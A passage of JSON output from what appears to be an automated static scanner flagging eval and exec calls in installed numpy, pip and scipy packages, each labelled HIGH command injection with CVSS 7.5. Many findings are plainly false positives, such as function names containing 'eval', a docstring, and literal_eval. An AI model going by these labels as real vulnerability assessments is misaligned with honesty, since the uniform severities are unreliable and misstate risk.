            "context": "            npyv_all_##SFX\n        \"\"\"\n        data_a = self._load_b(data * self._nlanes())\n        func = eval(intrin)\n        intrin = getattr(self, intrin)\n        desired = func(data_a)\n        simd = intrin(data_a)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 507,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "func = eval(intrin[:3])",
            "context": "        \"\"\"\n        pinf, ninf, nan = self._pinfinity(), self._ninfinity(), self._nan()\n        chk_nan = {\"xp\": 1, \"np\": 1, \"nn\": 2, \"xn\": 2}.get(intrin[-2:], 0)\n        func = eval(intrin[:3])\n        reduce_intrin = getattr(self, \"reduce_\" + intrin)\n        intrin = getattr(self, intrin)\n        hf_nlanes = self.nlanes//2",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 637,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "func = eval(intrin)",
            "context": "            npyv_all_##SFX\n        \"\"\"\n        data_a = self.load(data * self.nlanes)\n        func = eval(intrin)\n        intrin = getattr(self, intrin)\n        desired = func(data_a)\n        simd = intrin(data_a)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 698,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_load_tillz, npyv_load_till = eval(intrin)",
            "context": "    def test_memory_partial_load(self, intrin, elsizes, scale, fill):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_load_tillz, npyv_load_till = eval(intrin)\n        data = self._data()\n        lanes = list(range(1, self.nlanes + 1))\n        lanes += [self.nlanes**2, self.nlanes**4] # test out of range",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 718,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_store_till = eval(intrin)",
            "context": "    def test_memory_partial_store(self, intrin, elsizes, scale):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_store_till = eval(intrin)\n        data = self._data()\n        data_rev = self._data(reverse=True)\n        vdata = self.load(data)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 738,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_loadn = eval(intrin)",
            "context": "    def test_memory_noncont_load(self, intrin, elsizes, scale):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_loadn = eval(intrin)\n        for stride in range(-64, 64):\n            if stride < 0:\n                data = self._data(stride, -stride*self.nlanes)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 764,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_loadn_tillz, npyv_loadn_till = eval(intrin)",
            "context": "    def test_memory_noncont_partial_load(self, intrin, elsizes, scale, fill):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_loadn_tillz, npyv_loadn_till = eval(intrin)\n        lanes = list(range(1, self.nlanes + 1))\n        lanes += [self.nlanes**2, self.nlanes**4]\n        for stride in range(-64, 64):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 801,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_storen = eval(intrin)",
            "context": "    def test_memory_noncont_store(self, intrin, elsizes, scale):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_storen = eval(intrin)\n        data = self._data()\n        vdata = self.load(data)\n        hlanes = self.nlanes // scale",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 840,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_storen_till = eval(intrin)",
            "context": "    def test_memory_noncont_partial_store(self, intrin, elsizes, scale):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_storen_till = eval(intrin)\n        data = self._data()\n        vdata = self.load(data)\n        lanes = list(range(1, self.nlanes + 1))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 892,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "intrin = eval(intrin)",
            "context": "        \"\"\"\n        if elsize != self._scalar_size():\n            return\n        intrin = eval(intrin)\n        idx_itrin = getattr(self.npyv, f\"setall_u{elsize}\")\n        table = range(0, table_size)\n        for i in table:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 1098,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "func = eval(intrin)",
            "context": "            npyv_all_##SFX\n        \"\"\"\n        data_a = self.load(data * self.nlanes)\n        func = eval(intrin)\n        intrin = getattr(self, intrin)\n        desired = func(data_a)\n        simd = intrin(data_a)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_arrayprint.py",
            "line": 332,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(eval(repr(a), vars(np)), a)",
            "context": "            r\"array([b'\\x1B\\x5B\\x32\\x4B\\x07\\x41\\x0A\\x08',\" \"\\n\"\n            r\"       b'\\x1B\\x5B\\x33\\x31\\x6D\\x52\\x65\\x64'], dtype='|V8')\")\n\n        assert_equal(eval(repr(a), vars(np)), a)\n        assert_equal(eval(repr(a[0]), dict(np=np)), a[0])\n\n    def test_edgeitems_kwarg(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_arrayprint.py",
            "line": 333,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(eval(repr(a[0]), dict(np=np)), a[0])",
            "context": "            r\"       b'\\x1B\\x5B\\x33\\x31\\x6D\\x52\\x65\\x64'], dtype='|V8')\")\n\n        assert_equal(eval(repr(a), vars(np)), a)\n        assert_equal(eval(repr(a[0]), dict(np=np)), a[0])\n\n    def test_edgeitems_kwarg(self):\n        # previously the global print options would be taken over the kwarg",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_multiarray.py",
            "line": 1533,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_array_equal(eval(repr(xx), dict(np=np, array=np.array)), xx)",
            "context": "        assert_equal(xx, [[b'', b''], [b'', b'']])\n        # check for no uninitialized memory due to viewing S0 array\n        assert_equal(xx[:].dtype, xx.dtype)\n        assert_array_equal(eval(repr(xx), dict(np=np, array=np.array)), xx)\n\n        b = io.BytesIO()\n        np.save(b, xx)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_multiarray.py",
            "line": 3881,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "MyType = eval(\"type('MyType', (base,), class_namespace)\",",
            "context": "                              \"class_namespace\": class_namespace,\n                              \"__name__\": alleged_module,\n                              }\n            MyType = eval(\"type('MyType', (base,), class_namespace)\",\n                          eval_namespace)\n            if issubclass(MyType, np.ndarray):\n                # Use this range to avoid special case weirdnesses around",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_scalarmath.py",
            "line": 613,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "#            val2 = eval(val_repr)",
            "context": "#        for t in types:\n#            val = t(1197346475.0137341)\n#            val_repr = repr(val)\n#            val2 = eval(val_repr)\n#            assert_equal( val, val2 )\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_scalarmath.py",
            "line": 639,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "val2 = t(eval(val_repr))",
            "context": "                raise ValueError('hmm')\n            val = constr.view(t)[0]\n            val_repr = repr(val)\n            val2 = t(eval(val_repr))\n            if not (val2 == 0 and val < 1e-100):\n                assert_equal(val, val2)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_records.py",
            "line": 166,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "recordarr_r = eval(\"np.\" + repr(recordarr), {'np': np})",
            "context": "        recarr = a.view(np.recarray)\n        recordview = a.view(np.dtype((np.record, a.dtype)))\n\n        recordarr_r = eval(\"np.\" + repr(recordarr), {'np': np})\n        recarr_r = eval(\"np.\" + repr(recarr), {'np': np})\n        # Prints the type `numpy.record` as part of the dtype:\n        recordview_r = eval(\"np.\" + repr(recordview), {'np': np, 'numpy': np})",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_records.py",
            "line": 167,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "recarr_r = eval(\"np.\" + repr(recarr), {'np': np})",
            "context": "        recordview = a.view(np.dtype((np.record, a.dtype)))\n\n        recordarr_r = eval(\"np.\" + repr(recordarr), {'np': np})\n        recarr_r = eval(\"np.\" + repr(recarr), {'np': np})\n        # Prints the type `numpy.record` as part of the dtype:\n        recordview_r = eval(\"np.\" + repr(recordview), {'np': np, 'numpy': np})\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_records.py",
            "line": 169,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "recordview_r = eval(\"np.\" + repr(recordview), {'np': np, 'numpy': np})",
            "context": "        recordarr_r = eval(\"np.\" + repr(recordarr), {'np': np})\n        recarr_r = eval(\"np.\" + repr(recarr), {'np': np})\n        # Prints the type `numpy.record` as part of the dtype:\n        recordview_r = eval(\"np.\" + repr(recordview), {'np': np, 'numpy': np})\n\n        assert_equal(type(recordarr_r), np.recarray)\n        assert_equal(recordarr_r.dtype.type, np.record)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_umath.py",
            "line": 499,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "a, b, divisors = eval(ex_val)",
            "context": "        neg = -1 if fo.min < 0 else 1\n        # Large enough to test SIMD loops and remainder elements\n        lsize = 512 + 7\n        a, b, divisors = eval(ex_val)\n        a_lst, b_lst = a.tolist(), b.tolist()\n\n        c_div = lambda n, d: (",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_umath.py",
            "line": 563,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "a = eval(ex_val)",
            "context": "    ))\n    def test_division_int_reduce(self, dtype, ex_val):\n        fo = np.iinfo(dtype)\n        a = eval(ex_val)\n        lst = a.tolist()\n        c_div = lambda n, d: (\n            0 if d == 0 or (n and n == fo.min and d == -1) else n//d",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
            "line": 735,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\"\"\"def reraise(tp, value, tb=None):\n    try:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/utils/setuptools_build.py",
            "line": 10,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(compile('''",
            "context": "# Windows are correctly handled (it should be \"C:\\\\Users\" not \"C:\\Users\").\n_SETUPTOOLS_SHIM = textwrap.dedent(\n    \"\"\"\n    exec(compile('''\n    # This is <pip-setuptools-caller> -- a caller that pip uses to run setup.py\n    #\n    # - It imports setuptools before invoking setup.py, to enable projects that directly",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/utils/setuptools_build.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(compile(setup_py_code, filename, \"exec\"))",
            "context": "        filename = \"<auto-generated setuptools caller>\"\n        setup_py_code = \"from setuptools import setup; setup()\"\n\n    exec(compile(setup_py_code, filename, \"exec\"))\n    ''' % ({!r},), \"<pip-setuptools-caller>\", \"exec\"))\n    \"\"\"\n).rstrip()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/commands/configuration.py",
            "line": 239,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "subprocess.check_call(f'{editor} \"{fname}\"', shell=True)",
            "context": "            )\n\n        try:\n            subprocess.check_call(f'{editor} \"{fname}\"', shell=True)\n        except FileNotFoundError as e:\n            if not e.filename:\n                e.filename = editor",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/results.py",
            "line": 57,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "print(f\"{s} -> {fn(eval(s))}\")",
            "context": "        result = date_str.parse_string(\"1999/12/31\")\n\n        def test(s, fn=repr):\n            print(f\"{s} -> {fn(eval(s))}\")\n        test(\"list(result)\")\n        test(\"result[0]\")\n        test(\"result['month']\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1561,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, namespace, namespace)",
            "context": "            with open(script_filename) as fid:\n                source = fid.read()\n            code = compile(source, script_filename, 'exec')\n            exec(code, namespace, namespace)\n        else:\n            from linecache import cache\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1572,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(script_code, namespace, namespace)",
            "context": "                script_filename,\n            )\n            script_code = compile(script_text, script_filename, 'exec')\n            exec(script_code, namespace, namespace)\n\n    def _has(self, path):\n        raise NotImplementedError(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/markup.py",
            "line": 184,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "meta_params = literal_eval(parameters)",
            "context": "                            )\n\n                        try:\n                            meta_params = literal_eval(parameters)\n                        except SyntaxError as error:\n                            raise MarkupError(\n                                f\"error parsing {parameters!r} in {open_tag.parameters!r}; {error.msg}\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
            "line": 787,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec (\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec (\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\n        \"\"\"def reraise(tp, value, tb=None):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pygments/formatters/__init__.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "this method is equivalent to running ``eval()`` on the input file. The formatter is",
            "context": "\n    The file is expected to contain a Formatter class named ``formattername``\n    (by default, CustomFormatter). Users should be very careful with the input, because\n    this method is equivalent to running ``eval()`` on the input file. The formatter is\n    given the `options` at its instantiation.\n\n    :exc:`pygments.util.ClassNotFound` is raised if there are any errors loading",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pygments/formatters/__init__.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `formattername` from that namespace\n        if formattername not in custom_namespace:\n            raise ClassNotFound('no valid %s class found in %s' %",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/__init__.py",
            "line": 153,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `lexername` from that namespace\n        if lexername not in custom_namespace:\n            raise ClassNotFound('no valid %s class found in %s' %",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/integrate/_tanhsinh.py",
            "line": 397,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_func_eval(work):",
            "context": "    res_work_pairs = [('status', 'status'), ('integral', 'Sn'),\n                      ('error', 'aerr'), ('nit', 'nit'), ('nfev', 'nfev')]\n\n    def pre_func_eval(work):\n        # Determine abscissae at which to evaluate `f`\n        work.h = h0 / 2**work.n\n        xjc, wj = _get_pairs(work.n, h0, dtype=work.dtype,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/integrate/_tanhsinh.py",
            "line": 412,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_func_eval(x, fj, work):",
            "context": "        xj[work.ainf] *= -1\n        return xj\n\n    def post_func_eval(x, fj, work):\n        # Weight integrand as required by substitutions for infinite limits\n        if work.log:\n            fj[work.abinf] += (xp.log(1 + work.xj[work.abinf]**2)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/decorator.py",
            "line": 166,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, evaldict)",
            "context": "        filename = '<decorator-gen-%d>' % (next(self._compile_count),)\n        try:\n            code = compile(src, filename, 'single')\n            exec(code, evaldict)\n        except:  # noqa: E722\n            print('Error in generated code:', file=sys.stderr)\n            print(src, file=sys.stderr)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/_elementwise_iterative_method.py",
            "line": 227,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "x = pre_func_eval(work)",
            "context": "            cb_terminate = True\n\n    while work.nit < maxiter and xp_size(active) and not cb_terminate and n_elements:\n        x = pre_func_eval(work)\n\n        if work.args and work.args[0].ndim != x.ndim:\n            # `x` always starts as 1D. If the SciPy function that uses",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/_elementwise_iterative_method.py",
            "line": 250,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "post_func_eval(x, f, work)",
            "context": "            f = xp.reshape(f, x_shape)\n        work.nfev += 1 if x.ndim == 1 else x.shape[-1]\n\n        post_func_eval(x, f, work)\n\n        work.nit += 1\n        active = _check_termination(work, res, res_work_pairs, active,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/_lib/_bunch.py",
            "line": 160,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(s, namespace)",
            "context": "                 '__builtins__': dict(TypeError=TypeError,\n                                      AttributeError=AttributeError),\n                 '__name__': f'namedtuple_{typename}'}\n    exec(s, namespace)\n    __new__ = namespace['__new__']\n    __new__.__doc__ = f'Create new instance of {typename}({full_list})'\n    __init__ = namespace['__init__']",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_distn_infrastructure.py",
            "line": 359,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('del ' + obj)",
            "context": "\n# clean up all the separate docstring elements, we do not need them anymore\nfor obj in [s for s in dir() if s.startswith('_doc_')]:\n    exec('del ' + obj)\ndel obj\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_distn_infrastructure.py",
            "line": 735,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(self._parse_arg_template, ns)",
            "context": "        during unpickling (__setstate__)\n        \"\"\"\n        ns = {}\n        exec(self._parse_arg_template, ns)\n        # NB: attach to the instance, not class\n        for name in ['_parse_args', '_parse_args_stats', '_parse_args_rvs']:\n            setattr(self, name, types.MethodType(ns[name], self))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_continuous_distns.py",
            "line": 3450,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def sk1_eval(c, *args):",
            "context": "        v = np.where(c < -0.5, np.nan, g1**2.0*gam2k)\n\n        # skewness\n        def sk1_eval(c, *args):\n            def sk1_eval_f(c, g1, g2, g3, g2mg12):\n                return np.sign(c)*(-g3 + (g2 + 2*g2mg12)*g1)/g2mg12**1.5\n            return _lazywhere(c >= -1./3, (c,)+args, f=sk1_eval_f, fillvalue=np.nan)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_continuous_distns.py",
            "line": 3460,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def ku1_eval(c, *args):",
            "context": "        sk = _lazywhere(abs(c) > eps**0.29, (c,)+args, f=sk1_eval, fillvalue=sk_fill)\n\n        # kurtosis\n        def ku1_eval(c, *args):\n            def ku1_eval_f(g1, g2, g3, g4, g2mg12):\n                return (g4 + (-4*g3 + 3*(g2 + g2mg12)*g1)*g1)/g2mg12**2 - 3\n            return _lazywhere(c >= -1./4, args, ku1_eval_f, fillvalue=np.nan)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_chandrupatla.py",
            "line": 154,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_func_eval(work):",
            "context": "                      ('nit', 'nit'), ('nfev', 'nfev'), ('xl', 'x1'),\n                      ('fl', 'f1'), ('xr', 'x2'), ('fr', 'f2')]\n\n    def pre_func_eval(work):\n        # [1] Figure 1 (first box)\n        x = work.x1 + work.t * (work.x2 - work.x1)\n        return x",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_chandrupatla.py",
            "line": 159,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_func_eval(x, f, work):",
            "context": "        x = work.x1 + work.t * (work.x2 - work.x1)\n        return x\n\n    def post_func_eval(x, f, work):\n        # [1] Figure 1 (first diamond and boxes)\n        # Note: y/n are reversed in figure; compare to BASIC in appendix\n        work.x3, work.f3 = (xp.asarray(work.x2, copy=True),",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_chandrupatla.py",
            "line": 428,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_func_eval(work):",
            "context": "                      ('xl', 'x1'), ('xm', 'x2'), ('xr', 'x3'),\n                      ('fl', 'f1'), ('fm', 'f2'), ('fr', 'f3')]\n\n    def pre_func_eval(work):\n        # `_check_termination` is called first -> `x3 - x2 > x2 - x1`\n        # But let's calculate a few terms that we'll reuse\n        x21 = work.x2 - work.x1",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_chandrupatla.py",
            "line": 465,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_func_eval(x, f, work):",
            "context": "        work.q0 = q1\n        return x\n\n    def post_func_eval(x, f, work):\n        # Standard logic for updating a three-point bracket based on a new\n        # point. In QBASIC code, see \"IF SGN(X-X2) = SGN(X3-X2) THEN...\".\n        # There is an awful lot of data copying going on here; this would",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_optimize.py",
            "line": 303,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(x):",
            "context": "    # this is used as a mitigation for gh11403, slsqp/tnc sometimes\n    # suggest a move that is outside the limits by 1 or 2 ULP. This\n    # unclean fix makes sure x is strictly within bounds.\n    def eval(x):\n        x = _check_clip_x(x, bounds)\n        return func(x)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_bracket.py",
            "line": 245,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_func_eval(work):",
            "context": "                      ('fr', 'fr'), ('x', 'x'), ('f', 'f'),\n                      ('x_last', 'x_last'), ('f_last', 'f_last')]\n\n    def pre_func_eval(work):\n        # Initialize moving end of bracket\n        x = xp.zeros_like(work.x)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_bracket.py",
            "line": 263,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_func_eval(x, f, work):",
            "context": "\n        return x\n\n    def post_func_eval(x, f, work):\n        # Keep track of the previous location of the moving end so that we can\n        # return a narrower bracket. (The alternative is to remember the\n        # original fixed end, but then the bracket would be wider than needed.)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_bracket.py",
            "line": 655,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def pre_func_eval(work):",
            "context": "                      ('nit', 'nit'), ('nfev', 'nfev'), ('fl', 'fl'), ('fm', 'fm'),\n                      ('fr', 'fr')]\n\n    def pre_func_eval(work):\n        work.step *= work.factor\n        x = xp.empty_like(work.xr)\n        x[~work.limited] = work.xr0[~work.limited] + work.step[~work.limited]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_bracket.py",
            "line": 671,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def post_func_eval(x, f, work):",
            "context": "        )\n        return x\n\n    def post_func_eval(x, f, work):\n        work.xl, work.xm, work.xr = work.xm, work.xr, x\n        work.fl, work.fm, work.fr = work.fm, work.fr, f\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_nonlin.py",
            "line": 1590,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(wrapper, ns)",
            "context": "                             kwkw=kwkw_str)\n    ns = {}\n    ns.update(globals())\n    exec(wrapper, ns)\n    func = ns[name]\n    func.__doc__ = jac.__doc__\n    _set_doc(func)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/_spline_filters.py",
            "line": 326,
